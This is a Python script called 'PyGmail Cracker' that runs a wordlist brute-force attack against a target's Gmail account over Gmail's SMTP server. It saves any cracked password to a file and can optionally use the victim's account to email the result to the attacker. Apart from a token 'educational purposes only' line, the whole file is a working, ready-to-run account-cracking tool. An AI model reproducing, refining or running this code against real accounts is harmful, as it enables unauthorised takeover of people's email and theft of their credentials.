import time
import smtplib
import os
from email.message import EmailMessage
from multiprocessing import freeze_support

try:
    def clrScr():
        if (os.name == 'nt'):
            os.system('cls')
        else:
            os.system('clear')
    
    def sendMail(sender, receiver, password):
        message = "---------------------PyGmail Cracker-----------------------\n\n[+] New Credentials Found!\n[>]Username :- "+sender+"\n[>]Password :- **********"+"\nYou can get the password via the Script."+"\n---This program is written for Educational Purposes Only---"
        Emsg = EmailMessage()
        Emsg.set_content(message)
        Emsg['Subject'] = '-- PyGmail Cracker | Cracked '+sender+' --'
        Emsg['From'] = sender
        Emsg['To'] = receiver
        smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
        smtpserver.ehlo()
        smtpserver.starttls()
        smtpserver.login(sender, password)
        smtpserver.send_message(Emsg)

    def countPass(fname):
        f = open(fname, 'r')
        count = 0
        for line in f:
            count += 1
        return count

    def main():
        clrScr()
        paragraph = """
        #   ██████ ██    ██ ██████  ███████ ██████  ██   ██  █████  ██     ██ ██   ██  
        #  ██       ██  ██  ██   ██ ██      ██   ██ ██   ██ ██   ██ ██     ██ ██  ██   
        #  ██        ████   ██████  █████   ██████  ███████ ███████ ██  █  ██ █████    
        #  ██         ██    ██   ██ ██      ██   ██ ██   ██ ██   ██ ██ ███ ██ ██  ██   
        #   ██████    ██    ██████  ███████ ██   ██ ██   ██ ██   ██  ███ ███  ██   ██  
        #                                                                            
        #                ███████ ███████  ██████ ██    ██ ██████  ██ ████████ ██    ██ 
        #                ██      ██      ██      ██    ██ ██   ██ ██    ██     ██  ██  
        #          █████ ███████ █████   ██      ██    ██ ██████  ██    ██      ████   
        #                     ██ ██      ██      ██    ██ ██   ██ ██    ██       ██    
        #                ███████ ███████  ██████  ██████  ██   ██ ██    ██       ██    
        #                     __    __            __              
        #                    |__)  / _  _  _ .|  /   _ _  _|  _ _ 
        #                    |   \/\__)|||(_|||  \__| (_|(_|((-|  
        #                        /                                
        #
        #                                                   Contact the Developer :-
        #                                               [Youtube] CyberHawk Security
        
        
        """

        for i in paragraph:
      	    print(i, end='', flush=True)
      	    time.sleep(0.0001)
        smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
        smtpserver.ehlo()
        smtpserver.starttls()
        victim = input("\n[>] Enter the target's email address :- ")
        print("\n[+] Victim's Email is set to -----> ", victim,'\n')
        print("[+] Here's the list of files availible in the current working directory.\n")
        print('-'*150, '\n')
        files = os.listdir()
        for file in files:
            print('\n')
            print('[-]', end='', flush=True)
            for char in file:
                print(char, end='', flush=True)
                time.sleep(0.0001)
        print('\n\n\n','-'*150, '\n')
        while True:
            try:
                passwfilename = input("\n[>] Enter the wordlist's location: ")
                passwfilename = passwfilename.strip('\"')
                passwfilename = passwfilename.strip('\'')
                passwfile = open(passwfilename, "r")
                passCount = countPass(passwfilename)
                clrScr()
                break
            except FileNotFoundError:
                print('\n')
                print('[!] File Not Found! Try Again. (Case Sensitive)')
                for file in files:
                    print('[!] ', file, 'Not Found or Accessible!')

        print('[!] Additional Option')
        print('\n[+] If you want to get a Notification to your email after the bruteforce process, ')
        user = input('\n[>] Enter your email address (Leave blank to skip):- ')
        if (user == ''):
            addtionalOption = False
            print('\n[!] Skipping the process')
            time.sleep(2.0)
        else:
            addtionalOption = True
            print('\n[+] After the bruteforce attack you will receive a email if it succeed.')
            time.sleep(5.0)
        clrScr()



        msg = '[+] Launching Bruteforce Attack ...'
        for char in msg:
            print(char, end='', flush=True)
            time.sleep(0.1)
        print("\n[+] Success! Started the bruteforce process.\n[+] This is a very slow process. You can minimize this window.\n\n")


        retriesCount = 0
        for password in passwfile:
            retriesCount += 1
            if retriesCount == passCount:
                clrScr()
                print('[!] Password is not in the wordlist! Retry with a new wordlist!\n\n[!] Also there maybe a chance that the user didn\'t allowed ThirdParty Application Access to the account!')
            else:
                try:
                    smtpserver.login(victim, str(password))
                    clrScr()
                    print('-'*100)
                    print("\n\n[+] Password Found: %s" % password)
                    f = open('PasswordsFound!.txt', 'a')
                    f.write('\n\n')
                    f.write('-'*200)
                    f.write('\n')
                    f.write('Credentials Found! \n')
                    f.write('\n')
                    f.write('\tUsername :- '+victim)
                    f.write('\n')
                    f.write('\tPassword :- '+password)
                    f.write('\n')
                    f.write('-'*200)
                    f.close()
                    if addtionalOption:
                        sendMail(victim, user, password)
                    smtpserver.close()
                    break
                except smtplib.SMTPAuthenticationError:
                    print("[!] Password Incorrect: %s" % password)

    
    freeze_support()
    main()
    print('[+] Good bye! Have Nice Day!')


except KeyboardInterrupt:
    clrScr()
    print('\n[+] Terminating the Program... Success!\n\n')

except:
    print('\n\n[!] Check your internet connection! Unknown Error Detected!')
